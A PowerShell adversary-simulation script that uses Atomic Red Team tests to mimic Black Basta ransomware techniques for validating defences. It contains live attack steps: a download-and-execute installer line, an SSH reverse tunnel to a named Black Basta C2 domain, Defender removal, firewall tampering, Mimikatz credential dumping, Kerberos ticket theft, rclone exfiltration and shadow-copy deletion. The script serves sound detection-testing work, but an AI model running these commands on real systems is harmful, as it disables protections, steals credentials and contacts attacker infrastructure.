# Blackbasta Ransomware Atomic Simulation
# Author : Sebastian Kandler (@skandler)
# Date : 02/07/2024
# Simulate Blackbasta Ransomware tactics, techniques, and procedures (TTP) with atomic red team and some own tests to validate security controls
#
# Recommend to run it also without pattern based malware protection, to verify EDR behaviour based detections, otherwise pattern based AV will block most of the tools. An attacker who does obfuscation of these attack tools, wont be detected by pattern based av.
# Expect that attackers will turn off your EDR Solution like in steps 22-24, how do you detect and protect without EDR? running it without EDR will also test your system hardening settings like Windows Credential Dump Hardening settings like LSA Protect or Credential guard. 
#
# Prerequisite: https://github.com/redcanaryco/invoke-atomicredteam - works best with powershell 7
#
#
# see detailled descriptions of tests at github readme files for atomics for example for T1003: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md
#
# References
# 
# https://www.picussecurity.com/resource/blog/black-basta-ransomware-analysis-cisa-alert-aa24-131a
# https://www.threatdown.com/blog/black-basta-ransomware-exploits-windows-error-reporting-service-vulnerability/
# https://www.ic3.gov/Media/News/2024/240511.pdf
# https://www.kroll.com/en/insights/publications/cyber/black-basta-technical-analysis
# https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/
# https://atomicredteam.io/defense-evasion/T1564/
# https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-131a
#

Set-ExecutionPolicy Bypass -Force

function Test-Administrator  
{  
    [OutputType([bool])]
    param()
    process {
        [Security.Principal.WindowsPrincipal]$user = [Security.Principal.WindowsIdentity]::GetCurrent();
        return $user.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator);
    }
}

if(-not (Test-Administrator))
{
    Write-Error "This script must be executed as Administrator.";
    exit 1;
}

$Logfile = $MyInvocation.MyCommand.Path -replace '\.ps1$', '.log'
Start-Transcript -Path $Logfile

if (Test-Path "C:\AtomicRedTeam\") {
   Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
}
else {
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1'); Install-AtomicRedTeam -getAtomics -Force
  Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
}

# Atomic Test #1 - T1069.001 - Basic Permission Groups Discovery Windows (Local)
Invoke-AtomicTest T1069.001 -TestNumbers 2

# Atomic Test #2 - T1069.002 - Basic Permission Groups Discovery Windows (Domain)
Invoke-AtomicTest T1069.002 -TestNumbers 1



# Atomic Test #3 - T1569.002. System Services: Service Execution		Black Basta has installed and used PsExec to execute payloads on remote hosts.
Invoke-AtomicTest T1569.002 -TestNumbers 2  -GetPrereqs
Invoke-AtomicTest T1569.002 -TestNumbers 2

# Atomic Test #4 - T1047. Windows Management Instrumentation		Utilizes Invoke-TotalExec to push out the ransomware binary. - with remote wmi
Invoke-AtomicTest T1047 -TestNumbers 6

#Atomic Test #5 - T1569.002 - System Services: Service Execution Atomic Test #2 - Use PsExec to execute a command on a remote host
Invoke-AtomicTest T1569.002 -TestNumbers 2 -GetPrereqs
Invoke-AtomicTest T1569.002 -TestNumbers 2

# Atomic Test #6 - T1059.001. Command and Scripting Interpreter: PowerShell	Black Basta has encoded PowerShell scripts to download additional scripts.
Invoke-AtomicTest T1059.001 -TestNumbers 17 #obfuscated powershell

# Test 7 - T1059.001 Run C2 Powershell Command from Black-basta
echo "T1059.001 Run C2 Powershell Command from Black-basta"
powershell ssh a@restoreimagesinc.com -f -N -R 0.0.0.0:123 :127.0.0.1:22000 -p 443 -o StrictHostKeyChecking=no

# Atomic Test #8 - T1136. Create Account			Black Basta threat actors created accounts with names such as temp, r, or admin. incl. T1098 admin rights
Invoke-AtomicTest T1136 -TestNumbers 8

# Atomic Test #9 - T1543.003. Create or Modify System Process: Windows Service	Creates benign-looking services for the ransomware binary.
Invoke-AtomicTest T1543.003 -TestNumbers 1

# Atomic Test #10 - T1574.001. Hijack Execution Flow: DLL Search Order Hijacking	Black Basta used Qakbot, which has the ability to exploit Windows 7 Calculator to execute malicious payloads.
Invoke-AtomicTest T1574.001 -TestNumbers 1

#Atomic Test #11 - T1484.001. Domain Policy Modification: Group Policy Modification	Black Basta can modify group policy for privilege escalation and defense evasion.
Invoke-AtomicTest T1484.001 -TestNumbers 2

#Atomic Test #12 - T1218.010. System Binary Proxy Execution: Regsvr32		Black Basta has used regsvr32.exe to execute a malicious DLL.
Invoke-AtomicTest T1218.010 -TestNumbers 3 -GetPrereqs
Invoke-AtomicTest T1218.010 -TestNumbers 3

# Test #13 - T1112 - Black Basta makes modifications to the Registry.
echo "Black Basta makes modifications to the Registry."
cmd.exe /c REG ADD "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %TEMP%\dlaksjdoiwq.jpg /F
cmd.exe /c REG ADD "HKLM\SOFTWARE\Classes\.basta" /F
cmd.exe /c REG ADD "HKLM\SOFTWARE\Classes\.basta\DefaultIcon" /t REG_SZ /d %TEMP%\fkdjsadasd.ico /F
cmd.exe /c REG ADD "HKLM\SYSTEM\CurrentControlSet\services\Fax" /v "ImagePath" /t REG_EXPAND_SZ /d "C:\Users\Public\basta.exe" /F


# Test #13.1 - T1112 - T1547.011 - Windows Add Registry Value to Load Service in Safe Mode with Network
Invoke-AtomicTest T1112 -TestNumbers 35

#Atomic Test #14 - T1562.001. Impair Defenses: Disable or Modify Tools		Disables Windows Defender with batch scripts, such as d.bat or defof.bat.
Invoke-AtomicTest T1562.001 -TestNumbers 27 # with dism instead of powershell Command

#Test #15 - T1562.001. Impair Defenses: Disable or Modify Tools		Disables Windows Defender with batch scripts, such as d.bat or defof.bat.
echo "uninstall windows defender via powershell command from black basta"
Invoke-Command -ScriptBlock {if (Get-Command Uninstall-WindowsFeature -errorAction SilentlyContinue) { Uninstall-WindowsFeature -Name Windows-Defender }}

#Atomic Test #16 - T1562.004. Impair Defenses: Disable or Modify System Firewall	Uses batch scripts, such as rdp.bat or SERVI.bat, to modify the firewall to allow remote administration and RDP. - via netsh
Invoke-AtomicTest T1562.004 -TestNumbers 1

#Atomic Test #17 - T1562.004. Impair Defenses: Disable or Modify System Firewall	Uses batch scripts, such as rdp.bat or SERVI.bat, to modify the firewall to allow remote administration and RDP. - via Registry
Invoke-AtomicTest T1562.004 -TestNumbers 2

#Atomic Test #18 - T1562.009. Impair Defenses: Safe Boot Mode		Uses bcdedit to boot the device in safe mode.
Invoke-AtomicTest T1562.009 -TestNumbers 1

#Atomic Test #19 - T1622. Debugger Evasion			Uses IsDebuggerPresent to check if processes are being debugged.
Invoke-AtomicTest T1622 -TestNumbers 1

#Atomic Test #20 - T1003.001 - OS Credential Dumping: LSASS Memory - with Mimikatz
Invoke-AtomicTest T1003.001 -TestNumbers 5
Invoke-AtomicTest T1003.001 -TestNumbers 6 -GetPrereqs
Invoke-AtomicTest T1003.001 -TestNumbers 6 -CheckPrereqs
Invoke-AtomicTest T1003.001 -TestNumbers 6

# Atomic Test #21 T1016 - System Network Configuration Discovery on Windows
Invoke-AtomicTest T1016 -TestNumbers 1
Invoke-AtomicTest T1016 -TestNumbers 7

echo "writing output to c:\windows\pc_list.txt as black basta does"
cmd.exe /c whoami /all >> C:\Windows\pc_list.txt 
cmd.exe /c cmd /c set >> C:\Windows\pc_list.txt 
cmd.exe /c arp -a >> C:\Windows\pc_list.txt 
cmd.exe /c ipconfig /all >> C:\Windows\pc_list.txt 
cmd.exe /c net view /all >> C:\Windows\pc_list.txt 
cmd.exe /c nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdcs.WORKGROUP >> C:\Windows\pc_list.txt 
cmd.exe /c nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdcs.DomainName >> C:\Windows\pc_list.txt 
cmd.exe /c net share >> C:\Windows\pc_list.txt 
cmd.exe /c route print >> C:\Windows\pc_list.txt 
cmd.exe /c netstat -nao >> C:\Windows\pc_list.txt 
cmd.exe /c net localgroup >> C:\Windows\pc_list.txt 

# Atomic Test #22 T1082. System Information Discovery			Uses GetComputerName to query the computer name.
Invoke-AtomicTest T1082 -TestNumbers 7
$env:ComputerName

#Atomic Test #23 T1021.001. Remote Services: Remote Desktop Protocol		Black Basta has used RDP for lateral movement.
Invoke-AtomicTest T1021.001 -TestNumbers 1

# Atomic Test #24 T1560.001 - Archive Collected Data: Archive via Utility - with Win-rar and password protected
Invoke-AtomicTest T1560.001 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1560.001 -TestNumbers 1
Invoke-AtomicTest T1560.001 -TestNumbers 2

# Atomic Test #25  T1048.003 - Exfiltration Over Alternative Protocol - FTP - Rclone
Invoke-AtomicTest T1048.003 -TestNumbers 7 -GetPrereqs
Invoke-AtomicTest T1048.003 -TestNumbers 7

# Atomic Test #26  - T1567.002 - Exfiltrate data with rclone to cloud Storage - Mega (Windows)
Invoke-AtomicTest T1567.002 -GetPrereqs
Invoke-AtomicTest T1567.002 

# Atomic Test #27 - T1219. Remote Access Software			Black Basta has installed and used legitimate tools such as TeamViewer and AnyDesk on targeted systems 
Invoke-AtomicTest T1219 -TestNumbers 1 -GetPrereqs #teamviewer
Invoke-AtomicTest T1219 -TestNumbers 1             
Invoke-AtomicTest T1219 -TestNumbers 2 -GetPrereqs #AnyDesk
Invoke-AtomicTest T1219 -TestNumbers 2

# Atomic Test #28 T1573. Encrypted Channel			Uses Qakbot primarily and Cobalt Strike..
Invoke-AtomicTest T1573 -TestNumbers 1

# Atomic Test #29 T1559 Cobalt Strike usage
Invoke-AtomicTest T1559 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1559 -TestNumbers 1
Invoke-AtomicTest T1559 -TestNumbers 2
Invoke-AtomicTest T1559 -TestNumbers 3
Invoke-AtomicTest T1559 -TestNumbers 4

# Atomic Test #30 - T1490 - Windows - Delete Volume Shadow Copies with Powershell
Invoke-AtomicTest T1490 -TestNumbers 5

# Test #31 T1219: Remote Access Software - connection to known C2 Servers of Black Basta
echo "# Test 31 # T1219 connection to known C2 Servers of Black Basta"
ping -n 1 restoreimagesinc.com

# Test #32 T1558: Steal or Forge Kerberos Tickets
Invoke-AtomicTest T1558.002 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1558.002 -TestNumbers 1

# Test #33 - T1486 - Add Files with .basta File Ending + Black Basta Ransomnote
echo "# Test #32  - T1486 - Add Files with . File Ending + Black Basta Ransomnote"
New-Item -Path "C:\testfile-1.basta" -ItemType File
New-Item -Path "C:\testfile-2.basta" -ItemType File
New-Item -Path "C:\testfile-3.basta" -ItemType File
New-Item -Path "C:\testfile-4.basta" -ItemType File
New-Item -Path "C:\testfile-5.basta" -ItemType File
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/skandler/simulate-black-basta/main/black-basta-readme.txt" -OutFile "C:\readme.txt"


